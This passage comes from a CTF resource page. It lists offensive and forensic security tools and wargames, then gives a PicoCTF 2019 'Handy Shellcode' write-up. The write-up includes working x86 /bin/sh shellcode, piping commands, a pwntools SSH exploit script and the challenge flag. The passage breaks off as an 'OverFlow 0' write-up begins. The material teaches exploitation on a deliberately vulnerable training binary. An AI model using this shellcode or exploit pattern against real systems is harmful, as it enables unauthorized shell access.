href=https://tools.kali.org/password-attacks/hydra>Hydra</a> - A parallelized login cracker which supports numerous protocols to attack<li><a href=https://github.com/magnumripper/JohnTheRipper>John The Jumbo</a> - Community enhanced version of John the Ripper.<li><a href=http://www.openwall.com/john/>John The Ripper</a> - Password Cracker.<li><a href=https://github.com/intrd/nozzlr>Nozzlr</a> - Nozzlr is a bruteforce framework, trully modular and script-friendly.<li><a href=http://ophcrack.sourceforge.net/>Ophcrack</a> - Windows password cracker based on rainbow tables.<li><a href=https://github.com/lanjelot/patator>Patator</a> - Patator is a multi-purpose brute-forcer, with a modular design.</ul><h2><a class=header href=#exploits id=exploits>Exploits</a></h2><p><em>Tools used for solving Exploits challenges</em><ul><li><a href=https://github.com/OpenSecurityResearch/dllinjector>DLLInjector</a> - Inject dlls in processes.<li><a href=https://github.com/hellman/libformatstr>libformatstr</a> - Simplify format string exploitation.<li><a href=http://www.metasploit.com/>Metasploit</a> - Penetration testing software.<ul><li><a href=https://www.comparitech.com/net-admin/metasploit-cheat-sheet/>Cheatsheet</a></ul><li><a href=https://github.com/david942j/one_gadget>one_gadget</a> - A tool to find the one gadget <code>execve('/bin/sh', NULL, NULL)</code> call.<ul><li><code>gem install one_gadget</code></ul><li><a href=https://github.com/Gallopsled/pwntools>Pwntools</a> - CTF Framework for writing exploits.<li><a href=https://github.com/BinaryAnalysisPlatform/qira>Qira</a> - QEMU Interactive Runtime Analyser.<li><a href=https://github.com/JonathanSalwan/ROPgadget>ROP Gadget</a> - Framework for ROP exploitation.<li><a href=https://github.com/P1kachu/v0lt>V0lt</a> - Security CTF Toolkit.</ul><h2><a class=header href=#forensics-1 id=forensics-1>Forensics</a></h2><p><em>Tools used for solving Forensics challenges</em><ul><li><a href=http://www.aircrack-ng.org/>Aircrack-Ng</a> - Crack 802.11 WEP and WPA-PSK keys.<ul><li><code>apt-get install aircrack-ng</code></ul><li><a href=http://sourceforge.net/projects/audacity/>Audacity</a> - Analyze sound files (mp3, m4a, whatever).<ul><li><code>apt-get install audacity</code></ul><li><a href=http://sourceforge.net/projects/ophcrack/files/samdump2/>Bkhive and Samdump2</a> - Dump SYSTEM and SAM files.<ul><li><code>apt-get install samdump2 bkhive</code></ul><li><a href=http://www.ntcore.com/exsuite.php>CFF Explorer</a> - PE Editor.<li><a href=https://github.com/moyix/creddump>Creddump</a> - Dump windows credentials.<li><a href=https://github.com/kost/dvcs-ripper>DVCS Ripper</a> - Rips web accessible (distributed) version control systems.<li><a href=http://www.sno.phy.queensu.ca/%7Ephil/exiftool/>Exif Tool</a> - Read, write and edit file metadata.<li><a href=http://extundelete.sourceforge.net/>Extundelete</a> - Used for recovering lost data from mountable images.<li><a href=https://github.com/rabbitstack/fibratus>Fibratus</a> - Tool for exploration and tracing of the Windows kernel.<li><a href=http://foremost.sourceforge.net/>Foremost</a> - Extract particular kind of files using headers.<ul><li><code>apt-get install foremost</code></ul><li><a href=http://linux.die.net/man/8/fsck.ext3>Fsck.ext4</a> - Used to fix corrupt filesystems.<li><a href=http://malzilla.sourceforge.net/>Malzilla</a> - Malware hunting tool.<li><a href="http://www.netresec.com/?page=NetworkMiner">NetworkMiner</a> - Network Forensic Analysis Tool.<li><a href=http://malzilla.sourceforge.net/downloads.html>PDF Streams Inflater</a> - Find and extract zlib files compressed in PDF files.<li><a href=http://www.libpng.org/pub/png/apps/pngcheck.html>Pngcheck</a> - Verifies the integrity of PNG and dump all of the chunk-level information in human-readable form.<ul><li><code>apt-get install pngcheck</code></ul><li><a href=http://www.nirsoft.net/utils/resources_extract.html>ResourcesExtract</a> - Extract various filetypes from exes.<li><a href=https://github.com/williballenthin/shellbags>Shellbags</a> - Investigate NT_USER.dat files.<li><a href=https://sbmlabs.com/notes/snow_whitespace_steganography_tool>Snow</a> - A Whitespace Steganography Tool.<li><a href=https://github.com/snovvcrash/usbrip>USBRip</a> - Simple CLI forensics tool for tracking USB device artifacts (history of USB events) on GNU/Linux.<li><a href=https://github.com/volatilityfoundation/volatility>Volatility</a> - To investigate memory dumps.</ul><p><em>Registry Viewers</em><ul><li><a href=https://www.nirsoft.net/utils/offline_registry_view.html>OfflineRegistryView</a> - Simple tool for Windows that allows you to read offline Registry files from external drive and view the desired Registry key in .reg file format.<li><a href=https://accessdata.com/product-download/registry-viewer-2-0-0>Registry Viewer®</a> - Used to view Windows registries.</ul><h2><a class=header href=#networking id=networking>Networking</a></h2><p><em>Tools used for solving Networking challenges</em><ul><li><a href=https://github.com/robertdavidgraham/masscan>Masscan</a> - Mass IP port scanner, TCP port scanner.<li><a href=https://linoxide.com/monitoring-2/monit-linux/>Monit</a> - A linux tool to check a host on the network (and other non-network activities).<li><a href=https://github.com/GouveaHeitor/nipe>Nipe</a> - Nipe is a script to make Tor Network your default gateway.<li><a href=https://nmap.org/>Nmap</a> - An open source utility for network discovery and security auditing.<li><a href=https://www.wireshark.org/>Wireshark</a> - Analyze the network dumps.<ul><li><code>apt-get install wireshark</code></ul><li><a href=https://www.zeek.org>Zeek</a> - An open-source network security monitor.<li><a href=https://zmap.io/>Zmap</a> - An open-source network scanner.</ul><h2><a class=header href=#reversing id=reversing>Reversing</a></h2><p><em>Tools used for solving Reversing challenges</em><ul><li><a href=https://github.com/androguard/androguard>Androguard</a> - Reverse engineer Android applications.<li><a href=https://github.com/angr/angr>Angr</a> - platform-agnostic binary analysis framework.<li><a href=https://github.com/lxdvs/apk2gold>Apk2Gold</a> - Yet another Android decompiler.<li><a href=http://ibotpeaches.github.io/Apktool/>ApkTool</a> - Android Decompiler.<li><a href=https://github.com/programa-stic/barf-project>Barf</a> - Binary Analysis and Reverse engineering Framework.<li><a href=https://binary.ninja/>Binary Ninja</a> - Binary analysis framework.<li><a href=http://www.gnu.org/software/binutils/binutils.html>BinUtils</a> - Collection of binary tools.<li><a href=https://github.com/devttys0/binwalk>BinWalk</a> - Analyze, reverse engineer, and extract firmware images.<li><a href=https://github.com/nemerle/boomerang>Boomerang</a> - Decompile x86 binaries to C.<li><a href=https://github.com/docileninja/ctf_import>ctf_import</a> – run basic functions from stripped binaries cross platform.<li><a href=https://github.com/fkie-cad/cwe_checker>cwe_checker</a> - cwe_checker finds vulnerable patterns in binary executables.<li><a href=https://github.com/kirschju/demovfuscator>demovfuscator</a> - A work-in-progress deobfuscator for movfuscated binaries.<li><a href=https://github.com/frida/>Frida</a> - Dynamic Code Injection.<li><a href=https://www.gnu.org/software/gdb/>GDB</a> - The GNU project debugger.<li><a href=https://github.com/hugsy/gef>GEF</a> - GDB plugin.<li><a href=https://ghidra-sre.org/>Ghidra</a> - Open Source suite of reverse engineering tools. Similar to IDA Pro.<li><a href=http://www.hopperapp.com/>Hopper</a> - Reverse engineering tool (disassembler) for OSX and Linux.<li><a href=https://www.hex-rays.com/products/ida/>IDA Pro</a> - Most used Reversing software.<li><a href=https://github.com/skylot/jadx>Jadx</a> - Decompile Android files.<li><a href=http://www.javadecompilers.com>Java Decompilers</a> - An online decompiler for Java and Android APKs.<li><a href=https://github.com/Storyyeller/Krakatau>Krakatau</a> - Java decompiler and disassembler.<li><a href=https://github.com/sensepost/objection>Objection</a> - Runtime Mobile Exploration.<li><a href=https://github.com/longld/peda>PEDA</a> - GDB plugin (only python2.7).<li><a href=https://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool>Pin</a> - A dynamic binary instrumentaion tool by Intel.<li><a href=https://github.com/korcankaraokcu/PINCE>PINCE</a> - GDB front-end/reverse engineering tool, focused on game-hacking and automation.<li><a href=https://github.com/ChrisTheCoolHut/PinCTF>PinCTF</a> - A tool which uses intel pin for Side Channel Analysis.<li><a href=https://github.com/joelpx/plasma>Plasma</a> - An interactive disassembler for x86/ARM/MIPS which can generate indented pseudo-code with colored syntax.<li><a href=https://github.com/pwndbg/pwndbg>Pwndbg</a> - A GDB plugin that provides a suite of utilities to hack around GDB easily.<li><a href=https://github.com/radare/radare2>radare2</a> - A portable reversing framework.<li><a href=https://github.com/JonathanSalwan/Triton/>Triton</a> - Dynamic Binary Analysis (DBA) framework.<li><a href=https://github.com/gstarnberger/uncompyle>Uncompyle</a> - Decompile Python 2.7 binaries (.pyc).<li><a href=http://www.windbg.org/>WinDbg</a> - Windows debugger distributed by Microsoft.<li><a href=http://reverse.lostrealm.com/tools/xocopy.html>Xocopy</a> - Program that can copy executables with execute, but no read permission.<li><a href=https://github.com/Z3Prover/z3>Z3</a> - A theorem prover from Microsoft Research.</ul><p><em>JavaScript Deobfuscators</em><ul><li><a href=http://relentless-coding.org/projects/jsdetox/install>Detox</a> - A Javascript malware analysis tool.<li><a href=http://www.kahusecurity.com/posts/revelo_javascript_deobfuscator.html>Revelo</a> - Analyze obfuscated Javascript code.</ul><p><em>SWF Analyzers</em><ul><li><a href=https://github.com/CyberShadow/RABCDAsm>RABCDAsm</a> - Collection of utilities including an ActionScript 3 assembler/disassembler.<li><a href=http://www.swftools.org/>Swftools</a> - Collection of utilities to work with SWF files.<li><a href=https://bitbucket.org/Alexander_Hanel/xxxswf>Xxxswf</a> - A Python script for analyzing Flash files.</ul><h2><a class=header href=#services id=services>Services</a></h2><p><em>Various kind of useful services available around the internet</em><ul><li><a href=http://cow.cat/cswsh.html>CSWSH</a> - Cross-Site WebSocket Hijacking Tester.<li><a href=https://requestbin.com/>Request Bin</a> - Lets you inspect http requests to a particular url.</ul><h2><a class=header href=#steganography-1 id=steganography-1>Steganography</a></h2><p><em>Tools used for solving Steganography challenges</em><ul><li><a href=https://aperisolve.fr/>AperiSolve</a> - Aperi'Solve is a platform which performs layer analysis on image (open-source).<li><a href=http://www.imagemagick.org/script/convert.php>Convert</a> - Convert images b/w formats and apply filters.<li><a href=http://manpages.ubuntu.com/manpages/trusty/man1/exif.1.html>Exif</a> - Shows EXIF information in JPEG files.<li><a href=https://linux.die.net/man/1/exiftool>Exiftool</a> - Read and write meta information in files.<li><a href=http://www.exiv2.org/manpage.html>Exiv2</a> - Image metadata manipulation tool.<li><a href=https://sourceforge.net/projects/image-steg/>Image Steganography</a> - Embeds text and files in images with optional encryption. Easy-to-use UI.<li><a href=https://incoherency.co.uk/image-steganography>Image Steganography Online</a> - This is a client-side Javascript tool to steganographically hide images inside the lower "bits" of other images<li><a href=http://www.imagemagick.org/script/index.php>ImageMagick</a> - Tool for manipulating images.<li><a href="https://www.freebsd.org/cgi/man.cgi?query=outguess+&apropos=0&sektion=0&manpath=FreeBSD+Ports+5.1-RELEASE&format=html">Outguess</a> - Universal steganographic tool.<li><a href=https://packages.debian.org/sid/pngtools>Pngtools</a> - For various analysis related to PNGs.<ul><li><code>apt-get install pngtools</code></ul><li><a href=https://github.com/Y-Vladimir/SmartDeblur>SmartDeblur</a> - Used to deblur and fix defocused images.<li><a href=https://www.openhub.net/p/steganabara>Steganabara</a> - Tool for stegano analysis written in Java.<li><a href=https://linux.die.net/man/1/stegbreak>Stegbreak</a> - Launches brute-force dictionary attacks on JPG image.<li><a href=https://github.com/Paradoxis/StegCracker>StegCracker</a> - Steganography brute-force utility to uncover hidden data inside files.<li><a href=https://github.com/evyatarmeged/stegextract>stegextract</a> - Detect hidden files and text in images.<li><a href=http://steghide.sourceforge.net/>Steghide</a> - Hide data in various kind of images.<li><a href=http://www.caesum.com/handbook/Stegsolve.jar>Stegsolve</a> - Apply various steganography techniques to images.<li><a href=https://github.com/zed-0xff/zsteg/>Zsteg</a> - PNG/BMP analysis.</ul><h2><a class=header href=#web-1 id=web-1>Web</a></h2><p><em>Tools used for solving Web challenges</em><ul><li><a href=https://portswigger.net/burp>BurpSuite</a> - A graphical tool to testing website security.<li><a href=https://github.com/commixproject/commix>Commix</a> - Automated All-in-One OS Command Injection and Exploitation Tool.<li><a href=https://addons.mozilla.org/en-US/firefox/addon/hackbartool/>Hackbar</a> - Firefox addon for easy web exploitation.<li><a href=https://www.owasp.org/index.php/Projects/OWASP_Zed_Attack_Proxy_Project>OWASP ZAP</a> - Intercepting proxy to replay, debug, and fuzz HTTP requests and responses<li><a href="https://chrome.google.com/webstore/detail/postman/fhbjgbiflinjbdggehcddcbncdddomop?hl=en">Postman</a> - Add on for chrome for debugging network requests.<li><a href=https://github.com/evyatarmeged/Raccoon>Raccoon</a> - A high performance offensive security tool for reconnaissance and vulnerability scanning.<li><a href=https://github.com/sqlmapproject/sqlmap>SQLMap</a> - Automatic SQL injection and database takeover tool.
<code>pip install sqlmap</code><li><a href=https://github.com/andresriancho/w3af>W3af</a> - Web Application Attack and Audit Framework.<li><a href=http://xsser.sourceforge.net/>XSSer</a> - Automated XSS testor.</ul><h1><a class=header href=#resources id=resources>Resources</a></h1><p><em>Where to discover about CTF</em><h2><a class=header href=#operating-systems-1 id=operating-systems-1>Operating Systems</a></h2><p><em>Penetration testing and security lab Operating Systems</em><ul><li><a href=https://androidtamer.com/>Android Tamer</a> - Based on Debian.<li><a href=https://backbox.org/>BackBox</a> - Based on Ubuntu.<li><a href=https://blackarch.org/>BlackArch Linux</a> - Based on Arch Linux.<li><a href=https://labs.fedoraproject.org/security/>Fedora Security Lab</a> - Based on Fedora.<li><a href=https://www.kali.org/>Kali Linux</a> - Based on Debian.<li><a href=https://www.parrotsec.org/>Parrot Security OS</a> - Based on Debian.<li><a href=http://www.pentoo.ch/>Pentoo</a> - Based on Gentoo.<li><a href=http://urix.us/>URIX OS</a> - Based on openSUSE.<li><a href=http://www.wifislax.com/>Wifislax</a> - Based on Slackware.</ul><p><em>Malware analysts and reverse-engineering</em><ul><li><a href=https://github.com/fireeye/flare-vm/>Flare VM</a> - Based on Windows.<li><a href=https://remnux.org/>REMnux</a> - Based on Debian.</ul><h2><a class=header href=#starter-packs id=starter-packs>Starter Packs</a></h2><p><em>Collections of installer scripts, useful tools</em><ul><li><a href=https://github.com/zardus/ctf-tools>CTF Tools</a> - Collection of setup scripts to install various security research tools.<li><a href=https://github.com/jlevitsk/lazykali>LazyKali</a> - A 2016 refresh of LazyKali which simplifies install of tools and configuration.</ul><h2><a class=header href=#tutorials id=tutorials>Tutorials</a></h2><p><em>Tutorials to learn how to play CTFs</em><ul><li><a href=https://trailofbits.github.io/ctf/>CTF Field Guide</a> - Field Guide by Trails of Bits.<li><a href=http://ctfs.github.io/resources/>CTF Resources</a> - Start Guide maintained by community.<li><a href=http://www.dvwa.co.uk/>Damn Vulnerable Web Application</a> PHP/MySQL web application that is damn vulnerable.<li><a href=https://www.endgame.com/blog/how-get-started-ctf>How to Get Started in CTF</a> - Short guideline for CTF beginners by Endgame<li><a href=https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w>LiveOverFlow</a> - Video tutorials on Exploitation.<li><a href=https://github.com/xairy/mipt-ctf>MIPT CTF</a> - A small course for beginners in CTFs (in Russian).</ul><h2><a class=header href=#wargames id=wargames>Wargames</a></h2><p><em>Always online CTFs</em><ul><li><a href=https://backdoor.sdslabs.co/>Backdoor</a> - Security Platform by SDSLabs.<li><a href=https://crackmes.one/>Crackmes</a> - Reverse Engineering Challenges.<li><a href=https://exploit-exercises.lains.space/>Exploit Exercises</a> - Variety of VMs to learn variety of computer security issues.<li><a href=http://exploit.education>Exploit.Education</a> - Variety of VMs to learn variety of computer security issues.<li><a href=https://github.com/Samuirai/gracker>Gracker</a> - Binary challenges having a slow learning curve, and write-ups for each level.<li><a href=https://www.hackthebox.eu>Hack The Box</a> - Weekly CTFs for all types of security enthusiasts.<li><a href=https://www.hackthissite.org/>Hack This Site</a> - Training ground for hackers.<li><a href=https://hacking-lab.com/>Hacking-Lab</a> - Ethical hacking, computer network and security challenge platform.<li><a href=https://honeyourskills.ninja/>Hone Your Ninja Skills</a> - Web challenges starting from basic ones.<li><a href=http://io.netgarage.org/>IO</a> - Wargame for binary challenges.<li><a href=https://microcorruption.com>Microcorruption</a> - Embedded security CTF.<li><a href=http://overthewire.org/wargames/>Over The Wire</a> - Wargame maintained by OvertheWire Community.<li><a href=https://pentesterlab.com/>PentesterLab</a> - Variety of VM and online challenges (paid).<li><a href=http://pwn.eonew.cn/>PWN Challenge</a> - Binary Exploitation Wargame.<li><a href=http://pwnable.kr/>Pwnable.kr</a> - Pwn Game.<li><a href=https://pwnable.tw/>Pwnable.tw</a> - Binary wargame.<li><a href=https://pwnable.xyz/>Pwnable.xyz</a> - Binary Exploitation Wargame.<li><a href=http://reversing.kr/>Reversin.kr</a> - Reversing challenge.<li><a href=https://ringzer0team.com/>Ringzer0Team</a> - Ringzer0 Team Online CTF.<li><a href=https://www.root-me.org/>Root-Me</a> - Hacking and Information Security learning platform.<li><a href=https://github.com/xelenonz/game>ROP Wargames</a> - ROP Wargames.<li><a href=https://holidayhackchallenge.com/past-challenges/>SANS HHC</a> - Challenges with a holiday theme
released annually and maintained by SANS.<li><a href=http://smashthestack.org/>SmashTheStack</a> - A variety of wargames maintained by the SmashTheStack Community.<li><a href=https://ctf.viblo.asia>Viblo CTF</a> - Various amazing CTF challenges, in many different categories. Has both Practice mode and Contest mode.<li><a href=https://www.vulnhub.com/>VulnHub</a> - VM-based for practical in digital security, computer application & network administration.<li><a href=https://w3challs.com>W3Challs</a> - A penetration testing training platform, which offers various computer challenges, in various categories.<li><a href=http://webhacking.kr>WebHacking</a> - Hacking challenges for web.</ul><p><em>Self-hosted CTFs</em><ul><li><a href=https://github.com/bkimminich/juice-shop-ctf>Juice Shop CTF</a> - Scripts and tools for hosting a CTF on <a href=https://www.owasp.org/index.php/OWASP_Juice_Shop_Project>OWASP Juice Shop</a> easily.</ul><h2><a class=header href=#websites id=websites>Websites</a></h2><p><em>Various general websites about and on CTF</em><ul><li><a href=https://ctftime.org/>CTF Time</a> - General information on CTF occuring around the worlds.<li><a href=http://www.reddit.com/r/securityctf>Reddit Security CTF</a> - Reddit CTF category.</ul><h2><a class=header href=#wikis id=wikis>Wikis</a></h2><p><em>Various Wikis available for learning about CTFs</em><ul><li><a href=https://bamboofox.github.io/>Bamboofox</a> - Chinese resources to learn CTF.<li><a href=https://teambi0s.gitlab.io/bi0s-wiki/>bi0s Wiki</a> - Wiki from team bi0s.<li><a href=https://github.com/isislab/Project-Ideas/wiki>ISIS Lab</a> - CTF Wiki by Isis lab.<li><a href=https://github.com/OpenToAllCTF/Tips>OpenToAll</a> - CTF tips by OTA CTF team members.</ul><h2><a class=header href=#writeups-collections id=writeups-collections>Writeups Collections</a></h2><p><em>Collections of CTF write-ups</em><ul><li><a href=https://github.com/0e85dc6eaf/CTF-Writeups>0e85dc6eaf</a> - Write-ups for CTF challenges by 0e85dc6eaf<li><a href=http://captf.com/>Captf</a> - Dumped CTF challenges and materials by psifertex.<li><a href=https://github.com/ctfs/>CTF write-ups (community)</a> - CTF challenges + write-ups archive maintained by the community.<li><a href=https://github.com/abdilahrf/CTFWriteupScrapper>CTFTime Scrapper</a> - Scraps all writeup from CTF Time and organize which to read first.<li><a href=https://github.com/HackThisSite/CTF-Writeups>HackThisSite</a> - CTF write-ups repo maintained by HackThisSite team.<li><a href=https://github.com/mzfr/ctf-writeups/>Mzfr</a> - CTF competition write-ups by mzfr<li><a href=https://github.com/Gallopsled/pwntools-write-ups>pwntools writeups</a> - A collection of CTF write-ups all using pwntools.<li><a href=https://github.com/SababaSec/ctf-writeups>SababaSec</a> - A collection of CTF write-ups by the SababaSec team<li><a href=http://shell-storm.org/repo/CTF/>Shell Storm</a> - CTF challenge archive maintained by Jonathan Salwan.<li><a href=https://github.com/smokeleeteveryday/CTF_WRITEUPS>Smoke Leet Everyday</a> - CTF write-ups repo maintained by SmokeLeetEveryday team.</ul><h3><a class=header href=#license id=license>LICENSE</a></h3><p>CC0 :)<h1><a class=header href=#binary-exploitation id=binary-exploitation>Binary Exploitation</a></h1><h1><a class=header href=#picoctf19-handy-shellcode id=picoctf19-handy-shellcode>PicoCTF19 Handy Shellcode</a></h1><h2><a class=header href=#challenge id=challenge>Challenge</a></h2><p>This <a href=https://2019shell1.picoctf.com/static/55d1e7f761111a3cf6eec259e5dc44f8/vuln>program</a> executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode on the shell server. <a href=https://2019shell1.picoctf.com/static/55d1e7f761111a3cf6eec259e5dc44f8/vuln.c>Source</a>.<h2><a class=header href=#hints id=hints>Hints</a></h2><p>You might be able to find some good shellcode online.<h2><a class=header href=#solution id=solution>Solution</a></h2><p>Let's view that directory:<pre><code class=language-bash>samson@pico-2019-shell1:/problems/handy-shellcode$ ls -al
total 732
drwxr-xr-x   2 root       root                4096 Sep 28 21:53 .
drwxr-x--x 684 root       root               69632 Oct 10 18:02 ..
-r--r-----   1 hacksports handy-shellcode_5     39 Sep 28 21:53 flag.txt
-rwxr-sr-x   1 hacksports handy-shellcode_5 661832 Sep 28 21:53 vuln
-rw-rw-r--   1 hacksports hacksports           624 Sep 28 21:53 vuln.c
</code></pre><p>As my user is currently <code>samson</code> and I am not in that handy-shellcode_5 group, I cannot <code>cat</code> the file <code>flag.txt</code>. Let's take a look at the source code.<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];
  puts(&quot;Enter your shellcode:&quot;);
  vuln(buf);
  puts(&quot;Thanks! Executing now...&quot;);
  ((void (*)())buf)();
  puts(&quot;Finishing Executing Shellcode. Exiting now...&quot;);
  return 0;
}
</code></pre><p>It seems like it's almost prompting us to enter shellcode and execute it. More precisely, it takes in our input and echos it out with the <code>gets()</code> and <code>puts()</code> function calls.<p>Then we have this line here:<pre><code>  ((void (*)())buf)();
</code></pre><p>This takes <code>buf</code>, casts it to the void function pointer which returns nothing and then runs that function. So it'll execute whatever is at the address for <code>buf</code>.<p>Let's test our assumptions....<pre><code class=language-bash>samson@pico-2019-shell1:/problems/handy-shellcode$ ./vuln
Enter your shellcode:
A    
A
Thanks! Executing now...
Segmentation fault (core dumped)
</code></pre><p>So what is shellcode? Basically it's raw assembly code to be executed.<p>So let's go to a handy website full of these shellcodes: <a href=http://shell-storm.org/shellcode/>http://shell-storm.org/shellcode/</a><p>But before we decide which shellcode to use, we need to know our end goal. We want to drop into a shell that will let us <code>cat</code> or <code>print</code> the file <code>flag.txt</code>.<p>Let's start with dropping into a shell, is there a shellcode for <code>/bin/sh</code>.... Yes.<hr><p>Let's use this one: <a href=http://shell-storm.org/shellcode/files/shellcode-811.php>http://shell-storm.org/shellcode/files/shellcode-811.php</a><pre><code>/*
Title:	Linux x86 execve(&quot;/bin/sh&quot;) - 28 bytes
Author:	Jean Pascal Pereira &lt;pereira@secbiz.de&gt;
Web:	http://0xffe4.org


Disassembly of section .text:

08048060 &lt;_start&gt;:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80



*/

#include &lt;stdio.h&gt;

char shellcode[] = &quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;
                   &quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;
                   &quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;
                   &quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;;

int main()
{
  fprintf(stdout,&quot;Lenght: %d\n&quot;,strlen(shellcode));
  (*(void  (*)()) shellcode)();
}

</code></pre><p>So we can see that the shellcode just inserts assembly commands onto the stack, and by modifying the control flow of our code to start executing what's on the stack, we can jump into our shell.<p>Fun fact, the following instructions push the string that maps to the path <code>/bin/sh</code> on x86 processors.<pre><code> 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
</code></pre><p>But let's get that shellcode onto one line:<p><code>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</code><p>Let's try it?<pre><code class=language-bash>samson@pico-2019-shell1:/problems/handy-shellcode$ ./vuln 
Enter your shellcode:
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
Thanks! Executing now...
Segmentation fault (core dumped)
</code></pre><p>Wait that's not how we enter shellcode. We need the shell to interpret the <code>\x</code> as bytes not strings.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/handy-shellcode$ python -c &quot;print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'&quot; | ./vuln
Enter your shellcode:
1�Ph//shh/bin����°
                 ̀1�@̀
Thanks! Executing now...
</code></pre><p>Awesome it worked but it won't hold a shell for us, so let's use <code>cat</code>. To recap, if you <code>cat file.txt</code>, it'll just print out the contents of the file. However, if you just type <code>cat</code>, it will echo back whatever input you give it until you quit the program. Let's try it out.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/handy-shellcode$ (python -c &quot;print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'&quot;; cat) | ./vuln
Enter your shellcode:
1�Ph//shh/bin����°
                 ̀1�@̀
Thanks! Executing now...
id
uid=30646(samson) gid=8874(handy-shellcode_5) groups=8874(handy-shellcode_5),1002(competitors),30647(samson)
ls -al      
total 732
drwxr-xr-x   2 root       root                4096 Sep 28 21:53 .
drwxr-x--x 684 root       root               69632 Oct 10 18:02 ..
-r--r-----   1 hacksports handy-shellcode_5     39 Sep 28 21:53 flag.txt
-rwxr-sr-x   1 hacksports handy-shellcode_5 661832 Sep 28 21:53 vuln
-rw-rw-r--   1 hacksports hacksports           624 Sep 28 21:53 vuln.c
cat flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}
</code></pre><h2><a class=header href=#flag id=flag>Flag</a></h2><p><code>picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}</code><h2><a class=header href=#alternative-solution id=alternative-solution>Alternative solution</a></h2><p>The PicoCTF Shell comes with Python and Pwntools preinstalled so we could have leveraged this as well.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/handy-shellcode$ (python -c &quot;import pwn; print(pwn.asm(pwn.shellcraft.linux.sh()))&quot;; cat) | ./vuln
Enter your shellcode:
jhh///sh/bin��h�4$ri1�QjY�Q��1�j
                                X̀
Thanks! Executing now...
cat flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}
</code></pre><h2><a class=header href=#alternative-2 id=alternative-2>Alternative 2</a></h2><p>With this alternative, we use pwntools from our local machine to attach and exploit remotely.<p>In this example, we use pwntools to ssh, then send in the prebuilt shellcode, print out the flag, and then drop the user into the shell.<pre><code class=language-python>#!/usr/bin/env python
from pwn import *
import sys

REMOTE = True

if __name__ == &quot;__main__&quot;:
    if REMOTE:
        s = ssh(host='2019shell1.picoctf.com', user='samson', password=&quot;REDACTED&quot;, port=22)
        sh = s.process('/problems/handy-shellcode/vuln')
    else:
        sh = process(&quot;./vuln&quot;, stdout=process.PTY, stdin=process.PTY)

    sh.sendlineafter(':\n', asm(shellcraft.linux.sh()))
    sh.sendlineafter('$ ', 'cat /problems/handy-shellcode/flag.txt')
    sh.interactive()
</code></pre><pre><code class=language-bash>$ python3.8 exploit.py  
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] samson@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Starting remote process b'/problems/handy-shellcode/vuln' on 2019shell1.picoctf.com: pid 3796916
[*] Switching to interactive mode
picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}$ $ echo &quot;I'm in the shell now&quot;
I'm in the shell now
$ $ whoami
samson
</code></pre><h1><a class=header href=#picoctf19-overflow-0 id=picoctf19-overflow-0>PicoCTF19 OverFlow 0</a></h1><h2><a class=header href=#challenge-1 id=challenge-1>Challenge</a></h2><p>This should be easy. Overflow the correct buffer in this <a href=https://2019shell1.picoctf.com/static/1730bdc8ccd557c8ff20d1c28a5c3dbe/vuln>program</a> and get a flag. Its also found in /problems/overflow-0 on the shell server. <a href=https://2019shell1.picoctf.com/static/1730bdc8ccd557c8ff20d1c28a5c3dbe/vuln.c>Source</a>.<h2><a class=header href=#hints-1 id=hints-1>Hints</a></h2><p>Find a way to trigger the flag to print.<p>If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.<h2><a class=header href=#solution-1 id=solution-1>Solution</a></h2><p>Let's view that directory:<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-0$ ls -al
total 92
drwxr-xr-x   2 root       root          4096 Sep 28 21:54 .
